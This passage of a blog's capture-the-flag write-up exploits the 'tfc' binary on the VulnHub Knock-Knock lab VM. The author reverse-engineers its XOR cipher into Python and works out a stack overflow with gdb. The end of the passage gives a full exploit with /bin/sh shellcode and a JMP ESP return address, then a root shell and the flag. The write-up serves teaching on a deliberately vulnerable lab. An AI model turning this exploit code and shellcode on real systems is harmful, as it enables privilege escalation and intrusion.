+<p><code>crytFile</code> does some internal <em>things</em> (like <code>call   0x80484a0 &lt;open@plt&gt;</code> opening the file?) and eventually calls a function <code>xcrypt</code>. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of <code>xor</code> calls it had. Of course, this is only a guess and I may have missed something else completely.</p>
+
+<p>I also checked out the security features this binary was compiled with:</p>
+
+<pre><code class="language-bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>Woa. <strong>No</strong> security? Ok&hellip;</p>
+
+<h2 id="we-knocked-and-tfc-opened-the-door-to-bof:1122ba630e8da20bb861d870e35485fa">we knocked and tfc opened the door to bof</h2>
+
+<p>The disassembly of <code>tfc</code> did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)</p>
+
+<p>So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:</p>
+
+<pre><code class="language-bash"># create a file of roughly 2MB
+root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
+2+0 records in
+2+0 records out
+2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s
+
+# confirm the size of the file
+root@kali:~# ls -lh large.tfc
+-rw-r--r-- 1 root root 2.0M Oct 14 15:01 large.tfc
+
+# check how many characters we have in the file
+root@kali:~# wc -c large.tfc
+2097152 large.tfc
+
+# attempt encryption
+root@kali:~# ./tfc large.tfc out.tfc
+Segmentation fault
+</code></pre>
+
+<p><em>Segmentation fault</em>! Being able to crash <code>tfc</code> is really good news. I went on to test just how many characters were needed to crash <code>tfc</code> in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in <code>gdb</code>. I first prepared a new file with just &ldquo;A&rdquo; in it:</p>
+
+<pre><code class="language-bash">root@kali:~# echo -n $(python -c 'print &quot;A&quot;*6000') &gt; gdb-test.tfc
+</code></pre>
+
+<p>And continued to run it in <code>gdb</code>:</p>
+
+<pre><code class="language-bash">root@kali:~# gdb -q ./tfc
+Reading symbols from /root/tfc...(no debugging symbols found)...done.
+gdb-peda$ r gdb-test.tfc gdb-test-out.tfc
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb7fbfff4 --&gt; 0x14bd7c
+ECX: 0xffffffc8
+EDX: 0x9 ('\t')
+ESI: 0x0
+EDI: 0x0
+EBP: 0xc55193b
+ESP: 0xbffff3c0 (&quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&quot;...)
+EIP: 0x675c916
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x675c916
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff3c0 (&quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&quot;...)
+0004| 0xbffff3c4 --&gt; 0x5e43a802
+0008| 0xbffff3c8 --&gt; 0x3d9cc67a
+0012| 0xbffff3cc --&gt; 0x4050608c
+0016| 0xbffff3d0 (&quot;JH\\/Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&quot;l\311+\203˃&amp;\322t\217 &quot;...)
+0020| 0xbffff3d4 (&quot;Ux7;&lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰'\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&gt;\001\330Zn\242T\273wO\245uK\251\364?&gt;\362\005$1\016k\371\035\&quot;\030}x\367\177\320&amp;e:\202\030)\316\337/&lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&gt;\335#S@&amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&quot;l\311+\203˃&amp;\322t\217 BG\202\006&quot;...)
+0024| 0xbffff3d8 --&gt; 0x5489a33c
+0028| 0xbffff3dc --&gt; 0x3997552a
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0675c916 in ?? ()
+gdb-peda$
+</code></pre>
+
+<p>Ow. Ok, so we don&rsquo;t crash with a clean <em>0x41414141</em> as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.</p>
+
+<h2 id="planning-a-exploit:1122ba630e8da20bb861d870e35485fa">planning a exploit</h2>
+
+<p>So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs <strong>after</strong> the encryption function (remember <code>xcrypt</code>?) has run and wants to write the output to file (this is an assumption though).</p>
+
+<p>Ok. So. Make sure you focus now :)</p>
+
+<p>We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our <em>A</em> buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our <em>A</em> buffer as we have just observed it crash before the output is written.</p>
+
+<p>So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our <em>A</em> buffer long enough, then we can feed that to <code>tfc</code> and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering <code>tfc</code> had no security as part of the compilation, maybe execute some shell code on the stack.</p>
+
+<p>Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in <code>xcrypt()</code> to get started. Something I have practically 0 experience in.</p>
+
+<h2 id="reversing-xcrypt:1122ba630e8da20bb861d870e35485fa">reversing xcrypt()</h2>
+
+<p><em>For this part, I have to give a <strong>big</strong> high five to <a href="https://twitter.com/recrudesce">@recrudesce</a> for helping me understand parts of the pseudo code.</em></p>
+
+<p>Right. Essentially, in order for us to better understand what exactly is happening within <code>xcrypt()</code>, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its <em>reaaaaaly</em> hard to comprehend), but it <em>really</em> helps in getting the mind to understand the flow.</p>
+
+<p>For the pseudo code, I downloaded a demo version of <a href="http://www.hopperapp.com/">Hopper</a>. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded <code>tfc</code>, located the <code>xcrypt()</code> function and slapped the Pseudo code generation button:</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/knock_knock_hopper_pseudo.png" />
+    
+    
+</figure>
+
+
+<p>While looking around for pseudo code generation options, I came across the <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a> online service, which had the following image as a control flow graph for the calls in <code>xcrypt()</code>.</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/knock_knock_crypter_control_flow.png" />
+    
+    
+</figure>
+
+
+<p>Armed this this graph and the pseudo code, I was ready to start writing a python version of it.</p>
+
+<p>I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.</p>
+
+<pre><code class="language-c">int xcrypt(int arg0, int arg1) {
+</code></pre>
+
+<p>We start by declaring the fuction <code>xcrypt()</code>. <code>xcrypt()</code> takes 2 arguments. From inspecting the the parent function <code>cryptFile()</code> that calls <code>xcrypt()</code>, we can see the 2 arguments passed to <code>xcrypt()</code> is the file content and the length of the content respectively. So, <code>arg0</code> is the content and <code>arg1</code> is the content length.</p>
+
+<pre><code class="language-c">    var_C = 0xea1ab19f;
+    var_10 = arg_0;
+    var_4 = 0x0;
+</code></pre>
+
+<p>Here we have 3 variable assignments occur. <code>var_C</code> is set to <code>0xea1ab19f</code>, <code>var_10</code> is set to the file content from <code>arg0</code> and <code>var_4</code> is set to 0.</p>
+
+<pre><code class="language-c">    while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
+            *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
+</code></pre>
+
+<p>This part has one bit that may be very confusing. Comparing this to other output from say IDA and <a href="http://decompiler.fit.vutbr.cz/decompilation/">Retargetable Decompiler</a>, we will see that the <code>arg_4</code> referred to here is actually the length of the content, so <code>arg1</code> then.</p>
+
+<p>With that out the way, we see the start of a while loop for <code>arg_4 &gt;&gt; 0x2</code>, which translates to <code>len(content) &gt;&gt; 2</code>, which essentially just means <code>len(content) / 4</code>. While the output of this bitwise right shift is larger than <code>var_4</code>, which is 0 at the start, the loop will continue.</p>
+
+<p>Once inside the loop (and this is the part that for me was the hardest!!!) we see the line <code>*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;</code>. What helped me understand what is going on here was to understand that <code>var_10</code> (which is the content of our file) is being passed by reference. So, <code>var_4 * 4</code> is essentially <code>i*4</code> of the contents, or <code>content[i*4]</code> in python, which is the 4 bytes from <code>var_4</code>. These 4 bytes are being xored by <code>var_C</code>, replacing the original 4 bytes in <code>var_10</code>, to the new xored ones.</p>
+
+<p>So what can we deduce then? The hardcoded base encryption key for <code>tfc</code> is <code>0xea1ab19f</code>. Cool eh! But ok lets move on.</p>
+
+<pre><code class="language-c">var_8 = 0x0;
+while (var_8 &lt;= 0x7) {
+        if ((var_C &amp; 0x1) != 0x0) {
+                var_C = var_C &gt;&gt; 0x1;
+                var_C = var_C ^ 0x6daa1cf4;
+        }
+        else {
+                var_C = var_C &gt;&gt; 0x1;
+        }
+        var_8 = var_8 + 0x1;
+}
+var_4 = var_4 + 0x1;
+</code></pre>
+
+<p>Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from <code>while (0x0 &lt;= 0x7) {</code>.</p>
+
+<p>Once the loop has started, we see a bitwise <code>and</code> occur that checks if the key (<code>var_C</code>) &amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with <code>0x6daa1cf4</code>. Why <code>0x6daa1cf4</code>? Well, should the key ever become <code>1111 1111 1111 1111</code> (in binary), then any bitshifts will have no effect. If the <code>and</code> does not result in 0, just shift the bits.</p>
+
+<p>This occurs for 8 runs.</p>
+
+<p>So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.</p>
+
+<p>Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.</p>
+
+<p>That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)</p>
+
+<pre><code class="language-c">var_14 = arg_4 &amp; 0xfffffffc;
+var_4 = 0x0;
+while ((arg_4 &amp; 0x3) &gt; var_4) {
+        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);
+        var_C = var_C &gt;&gt; 0x8;
+        var_4 = var_4 + 0x1;
+}
+return 0x0;
+</code></pre>
+
+<h2 id="the-encryption-logic-replicated:1122ba630e8da20bb861d870e35485fa">the encryption logic replicated</h2>
+
+<p>While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+import struct
+
+# Hopper Pseudo Code
+
+# int xcrypt(int arg0, int arg1) {
+#     var_C = 0xea1ab19f;
+#     var_10 = arg_0;
+#     var_4 = 0x0;
+#     while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
+#             *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
+#             var_8 = 0x0;
+#             while (var_8 &lt;= 0x7) {
+#                     if ((var_C &amp; 0x1) != 0x0) {
+#                             var_C = var_C &gt;&gt; 0x1;
+#                             var_C = var_C ^ 0x6daa1cf4;
+#                     }
+#                     else {
+#                             var_C = var_C &gt;&gt; 0x1;
+#                     }
+#                     var_8 = var_8 + 0x1;
+#             }
+#             var_4 = var_4 + 0x1;
+#     }
+#     var_14 = arg_4 &amp; 0xfffffffc;
+#     var_4 = 0x0;
+#     while ((arg_4 &amp; 0x3) &gt; var_4) {
+#             *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp; 0xff);
+#             var_C = var_C &gt;&gt; 0x8;
+#             var_4 = var_4 + 0x1;
+#     }
+#     return 0x0;
+# }
+
+def xcrypt(content, length):
+
+    encrypted = ''
+
+    # set the base encryption key. this mutates with each pass
+    key = 0xea1ab19f    # var_C = 0xea1ab19f;
+
+    for word in range(length &gt;&gt; 2): # while (arg_4 &gt;&gt; 0x2 &gt; var_4) {
+        # apply the encryption logic as can bee seen in
+        # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
+
+        # grab the 4 bytes we working with
+        bytes = content[word*4:((word*4)+4)]
+
+        # struct unpack_from returns a tuple, we want 0 so that
+        # we end up with something we can xor
+        long_to_xor = struct.unpack_from('&lt;L', bytes)[0]
+
+        # apply the xor, this is the actual encryption part
+        encrypted_bytes = long_to_xor ^ key
+
+        # append the 4 encrypted bytes by packing them
+        encrypted += struct.pack('&lt;L',encrypted_bytes)
+
+        # next we run the key mutation
+        for mutation in xrange(8):
+
+            # no mutation is possible of the key is 1111 1111 1111 1111
+            if (key &amp; 1) != 0:
+                key = key &gt;&gt; 1
+                key = key ^ 0x6daa1cf4
+            else:
+                key = key &gt;&gt; 1
+
+    return encrypted;
+
+if __name__ == '__main__':
+
+    # set the content that we want to encrypt
+    content = &quot;A&quot; *1000
+    length = len(content)
+
+    encrypted = xcrypt(content, length)
+    print encrypted
+
+</code></pre>
+
+<h2 id="testing-the-script:1122ba630e8da20bb861d870e35485fa">testing the script</h2>
+
+<p>With the script done I obviously had to test it. I have a buffer of 1000 <em>A</em>&rsquo;s as the content and redirected the script output to a file:</p>
+
+<pre><code class="language-bash">root@kali:~# python make-crypt.py &gt; test.tfc
+
+root@kali:~# head test.tfc
+��[�]��C��dl�
+              H)�Aotg�\!�E?�̀l+�B��$f5%�&amp;�y�|S[I;R.�+T��w�$͟�7��?i�w'�3�s&lt;A��^��
+
+root@kali:~# ./tfc test.tfc out.tfc
+&gt;&gt; File crypted, goodbye!
+
+root@kali:~# head out.tfc
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre>
+
+<p>So to recap. We generated a file <code>test.tfc</code>, which is the encrypted version of 1000 <em>A</em>&rsquo;s. We then ran it through <code>tfc</code> which decrypted it to our cleartext <em>A</em>&rsquo;s again.</p>
+
+<h2 id="finding-eip:1122ba630e8da20bb861d870e35485fa">finding EIP</h2>
+
+<p>With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of <code>41</code>&rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 <em>A</em>&rsquo;s, and ran it through <code>gdb</code> to be able to inspect the Segmentation Fault that occurs.</p>
+
+<pre><code class="language-bash">root@kali:~# python make-crypt.py &gt; crash.tfc
+
+root@kali:~# gdb -q ./tfc
+Reading symbols from /root/tfc...(no debugging symbols found)...done.
+
+gdb-peda$ r crash.tfc crash-out.tfc
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb7fbfff4 --&gt; 0x14bd7c
+ECX: 0xffffffc8
+EDX: 0x9 ('\t')
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41414141 ('AAAA')
+ESP: 0xbffff3d0 ('A' &lt;repeats 200 times&gt;...)
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff3d0 ('A' &lt;repeats 200 times&gt;...)
+0004| 0xbffff3d4 ('A' &lt;repeats 200 times&gt;...)
+0008| 0xbffff3d8 ('A' &lt;repeats 200 times&gt;...)
+0012| 0xbffff3dc ('A' &lt;repeats 200 times&gt;...)
+0016| 0xbffff3e0 ('A' &lt;repeats 200 times&gt;...)
+0020| 0xbffff3e4 ('A' &lt;repeats 200 times&gt;...)
+0024| 0xbffff3e8 ('A' &lt;repeats 200 times&gt;...)
+0028| 0xbffff3ec ('A' &lt;repeats 200 times&gt;...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+gdb-peda$
+</code></pre>
+
+<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>
+
+<pre><code class="language-bash">root@kali:~# python make-crypt.py &gt; crash.tfc
+
+root@kali:~# gdb -q ./tfc
+Reading symbols from /root/tfc...(no debugging symbols found)...done.
+gdb-peda$ r crash.tfc crash-out.tfc
+
+[... snip ...]
+
+Stopped reason: SIGSEGV
+0x35684634 in ?? ()
+gdb-peda$
+</code></pre>
+
+<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>
+
+<pre><code class="language-bash">root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
+[*] Exact match at offset 4124
+</code></pre>
+
+<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>
+
+<pre><code class="language-bash">content = &quot;A&quot; *4124 + &quot;BBBB&quot; + &quot;C&quot;*(6000-4124-4)
+</code></pre>
+
+<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>
+
+<h2 id="exploiting-tfc:1122ba630e8da20bb861d870e35485fa">exploiting tfc</h2>
+
+<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/knock_knock_jmp_esp.png" />
+    
+    
+</figure>
+
+
+<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>
+
+<pre><code class="language-bash">content = &quot;A&quot; *4124 + &quot;\x93\x8e\x04\x08&quot; + &quot;C&quot;*(6000-4124-4)
+</code></pre>
+
+<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>
+
+<pre><code class="language-python">if __name__ == '__main__':
+
+    # 08048e93  ; jmp esp
+    shellcode = (
+        &quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68&quot; +
+        &quot;\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;
+    )
+
+    content = &quot;A&quot; *4124 + &quot;\x93\x8e\x04\x08&quot; + &quot;\x90&quot;*16 + shellcode + &quot;C&quot; *(6000-4124-4-16-len(shellcode))
+    length = len(content)
+
+    encrypted = xcrypt(content, length)
+    print encrypted
+</code></pre>
+
+<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>
+
+<pre><code class="language-bash">jason@knockknock:~$ python make-crypt.py &gt; crash.tfc &amp;&amp; ./tfc crash.tfc crash-out.tfc
+# id
+uid=0(root) gid=1000(jason) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
+</code></pre>
+
+<p>pwnd!</p>
+
+<p>As proof, the flag:</p>
+
+<pre><code class="language-bash"># cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt
+ __                         __              __                         __      ____
+|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
+|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
+|    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;  /_____/ |    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;   |   |
+|__|_ \___|  /\____/ \___  &gt;__|_ \         |__|_ \___|  /\____/ \___  &gt;__|_ \  |___|
+     \/    \/            \/     \/              \/    \/            \/     \/
+
+Hooray you got the flag!
+
+Hope you had as much fun r00ting this as I did making it!
+
+Feel free to hit me up in #vulnhub @ zer0w1re
+
+Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
+as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)
+
+root password is &quot;qVx4UJ*zcUdc9#3C$Q&quot;, but you should already have a shell, right? ;)
+</code></pre>
+
+<p>There are a number other goodies in /root to check out so be sure to do that!</p>
+
+<h2 id="conclusion:1122ba630e8da20bb861d870e35485fa">conclusion</h2>
+
+<p>Big shoutout to <a href="https://twitter.com/zer0w1re">@zer0w1re</a> for the VM and as always <a href="https://twitter.com/vulnhub">@VulnHub</a> for the hosting. The learning experience has been invaluable! :)</p>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
+  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+  s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+
+</body>
+</html>
+
